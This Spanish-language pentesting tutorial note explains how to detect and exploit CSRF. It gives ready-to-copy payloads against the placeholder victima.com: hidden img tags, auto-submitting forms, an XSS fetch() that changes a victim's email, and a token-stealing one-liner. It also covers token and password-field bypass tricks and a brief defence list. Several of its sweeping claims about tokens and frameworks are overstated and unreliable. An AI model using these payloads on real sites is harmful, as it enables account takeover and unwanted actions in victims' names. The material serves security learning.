## 📚 **Índice**

- [[# 1. ¿Qué es CSRF REALMENTE?]]
- [[#🧩 2. ¿Qué necesitas para que CSRF exista?]]
- [[#🔍 3. Reconociendo CSRF: lo que la mayoría de la gente NO sabe ver]]
    - [[#🟦 3.1. Peticiones que modifican datos]]
    - [[#🟦 3.2. Verificar método]]
    - [[#🟦 3.3. Identificadores de usuario en el body o URL]]
    - [[#🟦 3.4. Follow redirect para ver si el server traga la petición]]
- [[#🧪 4. Ataque CSRF Reflexivo (clásico pero útil)]]
- [[#🧪 5. Ataque CSRF Automático (sin clic, sin interacción)]]
- [[#🧠 6. Cómo explotar CSRF ]]
- [[#💣 7. Exploit CSRF automático listo para copiar]]
- [[#🧨 8. Cómo se integra CSRF + XSS ]]
- [[#🚀 9. Bypass de CSRF Tokens (avanzado)]]
- [[#🧊 10. Ejemplo ÚTIL: copiar un request capturado en Burp y pasarlo a exploit CSRF]]
- [[#🧠 11. Técnica de eliminación de campos (bypass real)]]
- [[#🔥 12. Cómo defender ]]
- [[#🧩 13. Checklist rápida ]]
- [[#🎁 14. Bonus: Exploit universal de 1 línea]]


---
#  **1. ¿Qué es CSRF REALMENTE? 

CSRF es:

> **Forzar al navegador de una víctima autenticada a ejecutar una petición HTTP que modifica datos sin su consentimiento.**

El navegador:

- **envía automáticamente cookies**, tokens de sesión, cabeceras de autenticación
    
- **no distingue entre “petición legítima” y “petición maliciosa”**
    
- **no pregunta al usuario nada**
    

Si la app NO tiene una protección sólida → **la acción ocurre**.

✔ cambiar contraseña  
✔ cambiar correo  
✔ editar perfil  
✔ borrar algo  
✔ enviar formularios internos  
✔ transferir fondos  
✔ publicar comentarios  
✔ modificar roles

CSRF es **“usar la sesión del usuario en su contra”**.

---

# 🧩 **2. ¿Qué necesitas para que CSRF exista? 

Para que exista un CSRF DE VERDAD, necesitas:

### ✔ 1. Una acción sensible vía **POST/GET**

Ejemplo: `/updatePassword`, `/profile/edit`, `/comment/post`.

### ✔ 2. Que esa acción NO tenga una defensa real:

- ❌ no hay token CSRF
    
- ❌ o el token CSRF es débil / predecible
    
- ❌ o es el mismo siempre
    
- ❌ o se puede capturar y reutilizar
    
- ❌ o está en un endpoint que “no debería manejar CSRF”
    
- ❌ o no revisan el método de la petición
    
- ❌ no revisan el _Origin_ ni _Referer_
    

### ✔ 3. Que la víctima esté **logueada**

El navegador enviará las cookies por sí solo.

---

# 🔍 **3. Reconociendo CSRF: lo que la mayoría de la gente NO sabe ver**

Tu objetivo es detectar:

## 🟦 3.1. Peticiones que modifican datos

Ejemplo:

- `/profile/update`
    
- `/password/change`
    
- `/settings/update`
    
- `/account/delete`
    
- `/admin/promoteUser`
    

Hover sobre un botón → muchas webs muestran el **request en el status bar**.  
Eso ya te da la ruta.

---

## 🟦 3.2. Verificar método

En Burp:

```
Right click → Change request method
```

Si aceptó POST como GET → **grave indicio**.

---

## 🟦 3.3. Identificadores de usuario en el body o URL

Si ves:

```
user_id=5
email=juan@example.com
role=user
```

→ **Manipulable a distancia**.

---

## 🟦 3.4. Follow redirect para ver si el server traga la petición

Burp:

```
Forward → Follow redirect
```

Si no hay error → **casi seguro CSRF**.

---

# 🧪 **4. Ataque CSRF Reflexivo (clásico pero útil)**

Supón que el endpoint es:

```
POST /profile/update
name=Daniel&email=algo@example.com
```

Si lo conviertes a GET:

```
http://victima.com/profile/update?name=HACKED&email=hacked%40mail.com
```

Y se procesa → vulnerable.

---

# 🧪 **5. Ataque CSRF Automático (sin clic, sin interacción)**

Si la web interpreta HTML dentro de mensajes, posts, comentarios:

```html
<img src="http://victima.com/profile/update?name=Hacked&email=x@x" width="1" height="1">
```

Esto provoca:

- la imagen se carga automáticamente
    
- el navegador hace la petición
    
- el navegador envía las cookies del usuario logueado
    
- la acción se ejecuta SIN CLICS
    

💀 **CSRF + XSS = ejecución automática y silenciosa.**

---

# 🧠 **6. Cómo explotar CSRF 

El atacante hace:

### ✔ Paso 1 — Interceptar el request legítimo con Burp

Modificar perfil, cambiar contraseña, actualizar settings…

### ✔ Paso 2 — Modificar la petición a tu conveniencia

Ejemplo:

- cambiar email por el tuyo
    
- cambiar nombre
    
- cambiar rol
    
- eliminar campo `current_password`
    
- enviar `[]` para probar bypass de validaciones
    

Ejemplo:

```
current_password=
new_password=123456
confirm_password=123456
```

Muchos backends tragan esto (!).

### ✔ Paso 3 — Convertirlo al método más permisivo

Burp:

```
Change request method
```

### ✔ Paso 4 — Enviarlo directo al server (sin el usuario)

Si lo acepta → CSRF confirmado.

### ✔ Paso 5 — Crear el exploit para enviarlo a la víctima

Puede ser:

- link
    
- imagen autoejecutable
    
- iframe
    
- form auto-submit
    
- script
    
- XSS que lo ejecute de inmediato
    

---

# 💣 **7. Exploit CSRF automático listo para copiar**

## ✔ Variante GET:

```html
<img src="http://victima.com/profile/update?email=cambiado@x.com" hidden>
```

## ✔ Variante POST con auto-submit:

```html
<form action="http://victima.com/profile/update" method="POST" id="f">
  <input type="hidden" name="email" value="nuevo@mail.com">
</form>
<script>document.getElementById('f').submit();</script>
```

Esta es la forma REAL de exploits CSRF de pentesting.

---

# 🧨 **8. Cómo se integra CSRF + XSS 

Si hay XSS en la plataforma, puedes hacer:

```js
<script>
fetch("/profile/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type":"application/x-www-form-urlencoded"},
  body: "email=HACKED@EVIL.COM"
});
</script>
```
¿QUÉ HACE ESTE FETCH?

👉 **ENVÍA UNA PETICIÓN AUTÉNTICA al servidor,  
desde el navegador de la víctima,  
con las cookies de la víctima,  
en nombre de la víctima.**

ℹ️ Esto se llama **CSRF a través del navegador DOM de la víctima (Remote Post Forgery)**  
y es **poderosísimo**, basicamente se lo envias y se tramita la peticion apenas abre el archivo.

---

# 🚀 **9. Bypass de CSRF Tokens (avanzado)**

### ✔ 1. Token fijo

Si ves:

```
_csrf_token=A1B2C3D4
```

Y no cambia → reusables → vulnerable.

---

### ✔ 2. Token en GET (siempre es vulnerable)

```
/update?_csrf_token=12345
```

GET + token = **CSRF trivial**.

---

### ✔ 3. Token predecible

Tiempo, incremental, MD5 sin sal, etc.

---

### ✔ 4. Token capturable con XSS (la mayoría pasa por aquí)

```js
document.querySelector("[name=_csrf_token]").value
```

---

### ✔ 5. Token no verificado en backend

Muchos dev insertan tokens pero **no los validan** (!).

---

# 🧊 **10. Ejemplo ÚTIL: copiar un request capturado en Burp y pasarlo a exploit CSRF**

Request original:

```
POST /profile/edit HTTP/1.1
Cookie: session=ABC123
Content-Type: application/x-www-form-urlencoded

name=Daniel&email=daniel@x.com
```

Exploit:

```html
<form action="http://victima.com/profile/edit" method="POST" id="auto">
  <input type="hidden" name="name" value="HACKED">
  <input type="hidden" name="email" value="hacked@evil.com">
</form>
<script>document.getElementById("auto").submit();</script>
```

---

# 🧠 **11. Técnica de eliminación de campos (bypass real)**

Si el endpoint requiere:

```
current_password=myPass
new_password=123
```

Prueba:

```
current_password=
```

o:

```
current_password[]
```

Muchos frameworks (Laravel, Spring, Symfony, Express) fallan y omiten validación → **cambio de contraseña sin password actual**.

---

# 🔥 **12. Cómo defender 

Los dev deben:

- usar tokens CSRF por formulario
    
- tokens únicos por usuario
    
- validar **Origin** y **Referer**
    
- bloquear métodos GET para acciones sensibles
    
- usar SameSite cookies
    
- no permitir renderizado de HTML sin sanitizar (evitar autoejecución)
    


---

# 🧩 **13. Checklist rápida 

- Endpoint modifica datos
    
- No hay token o es fijo
    
- El token se puede capturar
    
- Acepta GET (grave)
    
- Acepta métodos cambiados
    
- Acepta parámetros arbitrarios de usuario
    
- No valida origen
    
- Puedes montar exploit con `<img src>`
    
- Puedes montar exploit con formulario auto-submit
    
- Puedes eliminar campos requeridos
    
- Puedes alterar user_id
    
- puedes inyectar HTML o JS
    
- puedes hacer clickjacking combinando
    

Si 2 o más se cumplen → **CSRF casi seguro**.

---

# 🎁 **14. Bonus: Exploit universal de 1 línea**

Si el endpoint acepta GET y no requiere token:

```html
<img src="https://victima.com/admin/deleteUser?id=5" style="display:none">
```

Este payload es literalmente **todo lo que necesitas**.

---
